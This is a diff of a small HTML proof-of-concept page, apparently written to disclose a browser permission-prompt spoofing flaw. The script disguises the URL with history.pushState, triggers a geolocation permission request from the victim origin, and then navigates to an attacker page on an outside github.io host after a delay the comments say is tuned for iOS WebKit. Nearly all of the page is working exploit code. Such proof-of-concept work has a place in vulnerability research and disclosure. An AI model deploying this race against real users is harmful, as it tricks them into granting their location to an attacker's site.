@@ -2,29 +2,35 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Trusted Page</title>
+<title>Trusted Service</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 
 <body style="font-family:system-ui; text-align:center; margin-top:80px">
 
 <h2>Trusted Service</h2>
-<p>Click below to continue</p>
+<p>You are on a trusted page.</p>
+<p style="color:#b00020;font-size:13px">
+Observe the origin shown in the permission dialog.
+</p>
 
 <button id="start">Continue</button>
 
 <script>
 document.getElementById('start').onclick = () => {
-  // Make URL look trusted
+  // 1️⃣ Make URL look trusted
   history.pushState({}, '', '/trusted');
 
-  // Trigger permission
-  navigator.geolocation.getCurrentPosition(() => {}, () => {});
+  // 2️⃣ Trigger geolocation permission from VICTIM origin
+  navigator.geolocation.getCurrentPosition(
+    () => {},
+    () => {}
+  );
 
-  // Navigation race to attacker
+  // 3️⃣ Navigation race AFTER permission request starts
   setTimeout(() => {
-    location.href = 'https://cnfdnfial-ops.github.io/attacker.html';
-  }, 80);
+    location.href = 'https://cnfdnfial-ops.github.io/spoof/attacker.html';
+  }, 120); // delay tuned for iOS WebKit
 };
 </script>
 
